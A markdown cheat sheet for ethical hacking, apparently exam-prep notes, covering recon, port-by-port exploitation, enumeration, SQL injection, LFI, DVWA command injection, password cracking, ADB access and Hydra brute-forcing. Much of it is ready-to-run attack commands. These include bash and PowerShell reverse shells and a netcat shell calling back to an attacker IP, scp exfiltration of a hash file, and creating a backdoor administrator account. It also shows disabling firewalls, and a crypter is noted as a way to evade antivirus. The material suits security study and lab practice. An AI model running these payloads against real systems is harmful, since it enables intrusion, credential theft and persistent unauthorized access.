#### Resources link

[Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)

<details><summary><h4> ⏬ Recon </h4></summary>
  
  ##### via Web
  - [Tor Browser](https://www.torproject.org/download/)
  - [Google Search Engine](https://ahrefs.com/blog/google-advanced-search-operators/)
  - [Netcraft](https://searchdns.netcraft.com)
  - [Shodan](https://www.shodan.io/)
  - [Censys](https://censys.com/data-and-search/)

  ##### via application/tools
  - sublist3r `sublist3r -d domain -b all`
  - Harvester – `theharvester -d domain -n linkedin`
  - sherlock
  - userecon
  - photon
  - Web extractor
  - Httrack (for mirroring website)
  - Recon-ng
</details>

#### Network Scanning

- [Central Ops .net](https://centralops.net/co/)
- [OSINT framework](https://osintframework.com/)
- [NMAP cheatsheet](nmap.md) 🔗
- SX tool : command line network scanning tool that perform Arp scanning , TCP & UDP 
  ````bash
  sx arp 10.10.1.0/24
  sx arp 10.10.10.1 /24 –json | tee arp.cache      #for output in a file
  ````
- GUI application
  - Angry IP scanner : Perform host discovery any OS
  - Zenmap  - nmap’s  graphical interface tool
- uniscan
    Graphical:  Launch uniscan-gui and select required checkbox
    Command: `unicornscan 10.10.1.10 -Iv`
- Metasploit payloads(for scanning)
- some more tools
  ````bash
  #discover devices inside the network eth0
  netdiscover -i eth0
  #enumeration
  netstat -a 10.10.10.10      #netstat enumeration netbios
  snmp-check 10.10.10.10       #extract users from netbios - parrot
  masscan -e tun0 -p1-65535 -rate=1000 <ip> 
  ````

#### Essential ports

| **Port**  | **Service**                         | **Exploitation & Enumeration Insights** | **Insight (OS/Machine Identification)** |
|-----|-------------|----------------------------------------------|-------------------------------------|
| **21**   | FTP                            | 🔹 Check for **anonymous login** (`nmap --script ftp-anon`). <br> 🔹 Exploit **weak credentials**. | Open source vs. proprietary FTP servers hint at OS. |
| **22**   | SSH                            |🔹 **Brute-force weak credentials** (`hydra -L users.txt -P passwords.txt ssh://<IP>`). | Common on **Linux**, macOS, and network devices. |
| **23**   | Telnet                         | 🔹 **Legacy service** → Credentials **sent in cleartext**. <br> 🔹 **Intercept with Wireshark**, or brute-force (`hydra -P pass.txt telnet://<IP>`). |old Windows, Unix |
| **25**   | SMTP (Mail)                    |🔹 Enumerate users (`nmap --script smtp-enum-users`). <br> 🔹 Open relay testing (`nmap --script smtp-open-relay`). |Email servers, typically **Linux-based** |
| **53**   | DNS                            | 🔹 **Used in Active Directory (Windows DCs)**. <br> 🔹 If misconfigured, **zone transfer possible** (`dig axfr @<IP>`). |BIND service suggests **Linux**, Microsoft DNS hints at **Windows Server**. |
| **80/443** | HTTP/HTTPS                     | 🔹 **Web servers** (Apache, Nginx, IIS). <br> 🔹 **SQLi/XSS/LFI scanning** (`sqlmap -u "http://<IP>/page?id=1"`). <br> 🔹 **Directory brute-force** (`gobuster dir -u http://<IP>`). | Apache/Nginx on Linux, IIS on Windows |
| **110/995** | POP3/POP3S (Mail)             | 🔹 Email retrieval. **Can be brute-forced**. |- |
| **143/993** | IMAP/IMAPS (Mail)             | 🔹 Email storage, **potential credential leaks**. |- |
| **135**  | RPC                             | 🔹 **Windows-only** → Used in **DCE-RPC & Active Directory**. <br> 🔹 **Exploitable via MS08-067 (EternalBlue)**. |- |
| **137-139** | NetBIOS                      | 🔹 **Windows-only** → Used for **file sharing & AD authentication**. <br> 🔹 **Enumerate shares (`smbclient -L //<IP> -U ""`)**. |- |
| **389/636** | LDAP/LDAPS (Active Directory) | 🔹 **Windows Domain Controllers (DCs)**. <br> 🔹 **Enumerate AD users (`ldapsearch -h <IP> -x -s base`)**. |- |
| **445**  | SMB                             | 🔹 **Windows-only** → Used for **file sharing & AD authentication**. <br> 🔹 Exploit with **EternalBlue (MS17-010)** (`use exploit/windows/smb/ms17_010_eternalblue`). |- |
| **3268/3269** | Global Catalog (Active Directory) | 🔹 **Used for multi-domain queries**. <br> 🔹 Can be enumerated via LDAP queries. |- |
| **3306** | MySQL                           |🔹 Check for **default/root credentials** (`mysql -u root -p`). | Mostly found on **Linux servers** |
| **3389** | RDP (Remote Desktop)            | 🔹 **Windows-only** → Exploit **weak credentials** (`hydra -L users.txt -P pass.txt rdp://<IP>`). <br> 🔹 If vulnerable, use **BlueKeep (`CVE-2019-0708`)**. |- |
| **500/4500** | IPSec (VPN)                  | 🔹 **Used in VPN services**. <br> 🔹 Can be **brute-forced for PSK (Pre-Shared Keys)**. |- |
| **5060/5061** | SIP (VoIP)                   | 🔹 **VoIP services** → Can be **brute-forced for credentials** (`svwar -D -m INVITE -u <user> <IP>`). | found on **Linux-based PBX servers** (Asterisk, FreePBX). |
| **161/162** | SNMP (Network Devices)       | 🔹 **Used in Cisco routers, switches, and IoT devices**. <br> 🔹 Check for **public/private community strings (`nmap --script snmp-brute`)**. | - |
| **8080/8443** | Alternate HTTP/S            | 🔹 Found on **Tomcat servers, Admin panels**. <br> 🔹 **Tomcat Default Creds:** (`admin:admin`). | Tomcat = **Linux**, IIS = **Windows**. |
| **4444** | Metasploit Listener             | 🔹 **If open, likely indicates a reverse shell**. <br> 🔹 Run `nc -nv <IP> 4444` to connect. | -|
| **5432** | PostgreSQL                      |🔹 Exploit weak credentials (`nmap --script pgsql-brute`). | Database mostly found on **Linux servers**. |
| **5985/5986** | WinRM (Windows Remote Mgmt) | 🔹 **Windows-only** → Used for **PowerShell Remoting**. <br> 🔹 Brute-force login using `evil-winrm -i <IP> -u user -p password`. | -|
| **5555** | Android Debug Bridge (ADB)      | 🔹 **Android devices** in debug mode → Can be exploited for remote access. <br> 🔹 If open, run: `adb connect <IP>:5555 && adb shell`. | -|

---


#### Enumeration
- SMB (port 445):
````bash
  #list shares:
    nmap --script smb-enum-shares -p 445 <IP>
    #Finds shared folders on a Windows/Linux machine.
    #If the target allows anonymous access, you'll see default shared folders (C$, IPC$, ADMIN$)
    smbclient -L //<TARGET-IP> -U anonymous -N
  #-N → No password prompt (used for anonymous access checks) & If listed, access it:
  smbclient //<TARGET-IP>/DVWA -U anonymous
  #Then, download the file:
  smb: \> get uploads/hash.txt
````
- enum4linux -U 10.10.60.11     #-U → users enumeration or try below
- crackmapexec smb <IP> --users
- FTP (port 21):
````bash
  ftp <TARGET-IP>
  #Try logging in with anonymous credentials:
  User: anonymous
  Password: (leave blank)
#OR hydra -l user -P rockyou.txt ftp://<IP>

  ftp> ls
  #Navigate to DVWA/uploads/ and get the file:
  ftp> cd DVWA/uploads/
  ftp> get hash.txt
````
- smbmap
  ````
  smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
  -x = command

- RDP
  ````
  #find out if running service with nmap/metasploit(rdp_scanner)
  #brute force with hydra
  #use xfreerdp for gui login or use remmina
  ````
  
- AD Explorer (LDAP)
  ````
  or with nmap
  nmap -p 389 –script=ldap-brute –script-args ldap.base=’”cn=users,dc=CEH,dc=com”’ 10.10.1.22
  ````
- some more:
  ````bash
  #dir enumeration
  gobuster dir -u 10.10.0.1 -w /usr/share/wordlists/common.txt -t 50 -x php,html,txt -q
  #dir : directory listing        #-u : host
  #-w : wordlists        #-t : threads int / Number of concurrent threads (default 10)
  #-x : enumerate hidden files htm, php      #-q : –quiet / Don’t print the banner and other noise
  
  #snmp
  snmp-check 10.10.1.22       #after UDP scan with nmap

  #netbios
  nmap --script nbstat.nse <IP>
  
  #wordpress enumeration
  wpscan --url https://localchost.com --passwords=
  wpscan -u 10.10.. -e u vp
  wpscan -u 10.10.. -e u --wordlist path/rockyou.txt        #bruteforce
  #-e : enumerate      #-u : enumerate usernames       #-vp : vulnerable plugins

  #rlogin
  rlogin -l user <TARGET-IP>        #Allows a user to log in without a password if .rhosts is misconfigured.
  
  #wordlist generation
  cewl -w wordlist -d 2 -m 5 http://wordpress.com
  #-d = deeph of the scanning
  #-m = length of the words
  #-w = save to a file worlist
  ````

#### Vulnerability scanning
- openVAS | greenbone ~ Install `apt install openvas -y` , Start `gvm-setup` / `gvm-start`
- Tenable Nessus `systemctl start nessusd`
- NIST
- CVE org (https://www.cve.org)
- <details><summary>Nikto</summary></summary>

  ````bash
    nikto -h <TARGET-IP>        #basic
    nikto -h <TARGET-IP> -p 443,8080,8443      #Specific Ports
    nikto -h https://<TARGET-IP>          #https scan
    nikto -h <TARGET-IP> -useragent "Mozilla/5.0"         #Mimics a real browser.
    nikto -h <TARGET-IP> -o scan_results.txt          #output
    nikto -h <TARGET-IP> -o results.html -Format html
    nikto -h <TARGET-IP> -useproxy http://127.0.0.1:8080        #Proxyscan
    nikto -h <TARGET-IP> -mutate 2 -mutate-options my_wordlist.txt          #custom payload
    nikto -h url -Cgidirs all           #to scan all known CGI directories 
    nikto -h <TARGET-IP> -Tuning <value>        #specific vuln scan
    <value>  → 0 (default), 1,2 (Interesting & index files) 4,5,9 (XSS &SQLi) , 6,7 (RCE & File Upload), 3 (Misconfig), 9(Full or aggressive)
  ````
</details>

#### Stegnography
- steghide
    ````bash
    steghide extract -sf new.jpeg      #This will exctract the hidden file
    steghide embed -ef abc -cf web.jpeg -sf new.jpeg -e none -p 123
    ef = embedded file      #abc is a text file in this example
    cf = cover file      #web.jpeg is a image file
    sf = stegno file      #new.jpeg is a stego created new file
    e = encryption
    p = password
    
    ````
- openstego GUI tool (https://github.com/syvaidya/openstego/releases)
- stegosuite
- SNOW
  ````js
  //find or look for snow tool path
  SNOW.EXE -C -p 1234 output.txt   // For extracting the hidden message
  
  //Options available in SNOW
    -C Compress the data if concealing, or uncompress it while extracting.
    -Q Quiet mode, If not set means the application will report statistics such as compression percentage and amount of storage available.
    -S Report on the approximate amount of space available for a hidden message in the text file. Line length is taken into account, but other options are ignored.
    -p For setting the password for concealment of data and while extracting the data.
    -l line-len When appending whitespace, snow will always produce lines shorter than this value. By default, it is set to 80.
    -f Content of the file will get concealed in the input file.
    -m Message String The content written in this flag will be concealed into the input file.

  //Example
    Open the uncompressed file.
    Run the SNOW.exe file.
    Open CMD and reach the file that you want to hide the message within.
    Write the command like below for concealing the message into a text file:

      SNOW.EXE -C -p 1234 -m "hidden message" input.txt output.txt
      
      SNOW.EXE It tells the CMD window that we are using the snow tool for steganography.
      -C It is for compressing the data if concealing, or uncompressing it while extracting.
      -p It is for a password for concealing and extracting.
      input.txt The file in which you want to conceal the message within.
      output.txt The file in which you want the output.
  ````

#### Web explotation
##### SQL Injection  

<details><summary>Detect and Retrieving</summary>
  
- note that `-- ` is a comment indicator in mySQL or `--` `#` in oracle/MS/Pgres. This `'--` means that the rest of the query is interpreted as a comment, effectively removing it.  
- `condition'+OR+1=1--` in which, other then condition we input 1 is equal to 1. As 1=1 is always true, the query returns all items.   
- `' ORDER BY 1--` `' ORDER BY 2--`...until error or `' UNION SELECT NULL--` `' UNION SELECT NULL,NULL--` ...,is to get number of columns  
- [here more detailed comparison on queries of databases types](https://portswigger.net/web-security/sql-injection/cheat-sheet)
</details>
<details><summary>to determine the database version for some popular database types:</summary>
  
Microsoft, MySQL 	`SELECT @@version`  
Oracle 	`SELECT * FROM v$version`  
PostgreSQL 	`SELECT version()`  

For example, you could use a UNION attack with the following input:  
````sql
  ' UNION SELECT @@version--
````

</details>
<details><summary>Listing the contents of the database(except Oracle)</summary>

you can query information_schema.tables to list the tables in the database: 
````sql
  SELECT * FROM information_schema.tables
````
You can then query information_schema.columns to list the columns in individual tables:
````sql
  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
````

</details>

<details><summary>Blind SQLi</summary>

In Cookies, If suppose we found users' as a table and administrator' as a username with multiple boolean conditions with burp repeater, then with intruder we can cluster bomb:  
````sql
  vz9' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§;
````
</details>


[SQLmap cheetsheet](sqlmap.md) 🔗
````js
// sql injection
sqlmap -u http://10.10.197.40/administrator.php --forms --dump

-u = url
--forms = grab the forms /detect
--dump = retrieve data form de sqli

#### basic sqli injection
sqlmap -u 10.10.77.169 --forms --dump

- u = url
- --forms= check the forms automatically
- --dump= dump dthe database data entries

// extract database
sqlmap -u <url> --cookie <cookie> --dbs
sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
// extract colums
Sqlmap -u http://localchost.com/hey.php?artist=1 --D databasname --T artists --columns
// extract data of the table and the column inside of the db
sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
````
Local File Inclusion (LFI) Attack (If Web App is Vulnerable)
````html
  <!--If the website is vulnerable to LFI, try:-->
  http://<TARGET-IP>/vulnerable.php?file=../../DVWA/uploads/hash.txt
  <!--Or try Windows-style LFI:-->
  http://<TARGET-IP>/vulnerable.php?file=../../../../../../../../windows/system32/drivers/etc/hosts
  <!--If the app is filtering ../, use URL encoding:-->
  http://<TARGET-IP>/vulnerable.php?file=..%2F..%2FDVWA/uploads/hash.txt
````

<details><summary> ⏬ DVWA</summary>
  
Basic Commands
````bash
  ; whoami
  && whoami #If successful, it should return the current user (e.g., www-data in Linux).
````
List Files & Directories
````bash
  ; ls -la    #linux
  && dir    #windows
````
Read Files & user info (Sensitive Info)
````bash
  ; cat /etc/passwd    #linux
  ; cut -d: -f1 /etc/passwd      #View Only Usernames in above
  && type C:\Windows\System32\drivers\etc\hosts      #windows
  net user     #View All Users in windows
  query user    #View Active Logged-in Users
  net user /domain    #View Domain Users
````
Get the file:
- Try Accessing via a Web Browser (If DVWA Has File Access)
````js
  http://<TARGET-IP>/DVWA/uploads/hash.txt
  //If the file is accessible, you can download it directly // wget
````
- LFI via web [browser](#web-explotation)
- using [smb](#enumeration)
- using [ftp](#enumeration)
- Windows:
    If you have Command Injection or an RCE shell, use:
    ````bash
    type C:\DVWA\uploads\hash.txt    #CMD (Windows)
    Get-Content C:\DVWA\uploads\hash.txt     #powershell
    scp C:\DVWA\uploads\hash.txt attacker@<ATTACKER-IP>:/home/kali/     #To transfer the file to your system
    
    meterpreter > download C:\\DVWA\\uploads\\hash.txt .   #If you have Meterpreter, download the file
    ````
Check Network & Connections
````bash
  #Linux:
  ; ifconfig
  ; netstat -an
  #Windows:
  && ipconfig
  && netstat -an
````
Get a Reverse Shell (Full Access)
If outbound connections are allowed, you can get a reverse shell, with [netcat](#netcat-reverse-shell)
````bash
  #If nc is unavailable, try:
  ; bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1
  
  #Windows Reverse Shell, set up listener on Kali:
  nc -lvnp 4444
  #Then inject:
  && powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER-IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
````
Create a New User
If you have enough privileges, add a new user for persistent access.
````bash
  ; useradd -m hacker && echo "hacker:password" | chpasswd         #Linux
  
  #windows
  && net user hacker P@ssw0rd /add
  && net localgroup administrators hacker /add
````
Disable Firewalls
````bash
  ; iptables -F      #linux
  && netsh advfirewall set allprofiles state off       #windows
````
Metasploit (If You Have a Shell)
If you have Meterpreter access:
````bash
  meterpreter > getuid
  #List all users:
  meterpreter > run post/windows/gather/enum_users
  meterpreter > help
````
> How to Fix the Vulnerability?
> > Sanitize input: Use escapeshellcmd() and escapeshellarg().  
> > Whitelist commands: Only allow specific inputs.  
> > Use prepared statements: Avoid direct execution of user input.  
</details>

#### System Hacking
##### Netcat Reverse Shell
Attacker (Listener)
  ```
  nc -lvnp 4444
  ```
Victim (Windows/Linux)
  ```
  nc -e /bin/bash <ATTACKER-IP> 4444
  ```

##### Theef
  > Server exe need to be run on victim and client exe on Attacker

#### Malware Analysis
- [Virus Total](https://www.virustotal.com/gui/home/search)
- [Hybrid Analysis](https://www.hybrid-analysis.com/)
- Antiscan.me
- DIE Tool `die /path/to/binary.exe` or `diec /path/to/binary`
  
 > swazycrypter encryptes the application with more complexity/hash to avoid antivirus to find it.

#### Cryptography

> Symmetric Encryption: Use same key for Encryption and decryption  
> Asymmetric Encryption: Use Public/Private for Encryption and Decryption

##### Hashing/decoding
<details><summary>To find the password of a ZIP file</summary>
  
````bash
  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <zipfile.zip>
  #-v → Verbose mode (show progress).
  #-u → Tries to unzip to verify correct password.
  #-D → Dictionary attack mode.
  #-p rockyou.txt → Uses RockYou wordlist (common passwords).
  #with john
    zip2john <zipfile.zip> > hash.txt        #First, extract the ZIP hash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt        #Then, crack it using rockyou.txt
    hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force        #OR use hashcat (mode 13600 for ZIP)
    john --show hash.txt      #To see the cracked password
  #If the ZIP uses weak encryption (pkzip format), you might be able to extract files without a password:
    unzip -P "" <zipfile.zip>
````
</details>

To decrypt (crack) a hashed password:
- <details><summary>Online:</summary>

    | **Website** | **Supports (MD5, SHA1, NTLM, etc.)** | **Notes** |
    |-------------|---------------------------------|-----------|
    |[CrackStation](https://crackstation.net/) | MD5, SHA1, SHA256, SHA512, NTLM | Large precomputed database (rainbow tables) |
    |[Hashes.com](https://hashes.com/) | MD5, SHA1, NTLM, MySQL, bcrypt | Free + premium cracking, community-driven |
    |[OnlineHashCrack](https://www.onlinehashcrack.com/) | MD5, SHA1, NTLM, WPA, bcrypt | Supports **offline cracking** (upload files) |
    |[MD5 Decrypt](https://md5decrypt.net/) | MD5, SHA1, NTLM, MySQL | Fast lookup for common hashes |
    |[CMD5](https://www.cmd5.com/) | MD5, SHA1, SHA256, MySQL | Good for **NTLM & MySQL** hashes |
  </details>

- <details><summary>Locally:</summary>

  - Identify the Hash Type
    ```
    hashid hash.txt
    hashcat --identify hash.txt
    ```
  - Crack the Hash
    ```
    // Using john (John the Ripper)
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    john --show hash.txt   // Check results
    
    // Using hashcat ( Find the correct hash mode (-m) )
    hashcat -m <HASH_MODE> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
    hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt   // Example
    ```
  - Brute Force If No Dictionary Matches
    ```
    hashcat -m <HASH_MODE> -a 3 hash.txt ?a?a?a?a?a?a     // (Adjust ?a?a?a... for password length.)
    ```
  
  - Decode Base64 (If Encoded)
  If the file contains Base64-encoded text, decode it first:
    ```
    cat hash.txt | base64 -d
    ```
  If the hash is common (MD5, SHA1, NTLM), rockyou.txt is usually enough to crack it!
</details>

- GUI Applications
  - Hash Calc (window based tool)
  - MD5 Calculator (window based – git/sourceforage)
  - Cryptoforge
      - Not a free application
      - We can lock/encypt a file/folder with the password
  - <details><summary>Encode/Decode data with BCTTextEncoder</summary>
 
      - Download BCTextEncoder from the official site or trusted sources.
      - Run BCTextEncoder.exe (No installation required).
      - In the "Input Text" box, enter the message you want to encrypt.
      - Check "Use Password" and enter a strong password.
      - Click "Encode".
      - The encrypted text appears in the "Output Text" box.
      - Paste the encrypted message into the "Input Text" box.
      - Enter the decryption password (same as the one used for encryption).
      - Email or send the encrypted text securely.
    </details>
##### Disk Encryption
  - Bitlocker
  - <details><summary>Veracrypt (https://veracrypt.eu/en/Downloads.html)</summary>

    - after installing/opening application , create a volume
    - Choose an encrypted file container/ Non-system drive / entire drive
    - Select standard and location for this file
    - Choose encryption algorithm like AES
    - Allot size for the folder and choose password
    - Move the cursor for more complexity of encryption
    - Finish the setup
    - Now agin start the veracrypt application and select the output file and we can attach/mount it as a 'New Volumn'.
</details>

##### Android Hacking

<details><summary><b>A</b>ndroid <b>D</b>ebug <b>B</b>ridge</summary> We need this application here, and android victim must be in debug-mode
  
````bash
  apt-get update
  sudo apt-get install adb -y
  adb devices -l
  adb connect <ip>
  adb shell
  $cd /path     //find folder
  $adb pull sdcard/test.txt /home/userr/Desktop
````

With Phonesploit
- Download and install this application from github
- python3 phonesploit.py
- use options to view/connect/download accordingly
</details>

<details><summary><h4>Hydra</h4></summary>

  ````
  hydra -L user.txt -P pass.txt smb://10.10.10.4
  L =  logging file name
  P = Passwords file name
  hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11

hydra -l username -P passlist.txt 192.168.0.100 ssh            #SSH
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100            #FTP

#If the service isn't running on the default port, use -s
hydra -L userlist.txt -P passlist.txt ftp://192.168.0.100 -s 221

hydra -l admin -P passlist.txt -o test.txt 192.168.0.7 telnet      #TELNET

# Login form
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"  
  ````
</details>

#### More
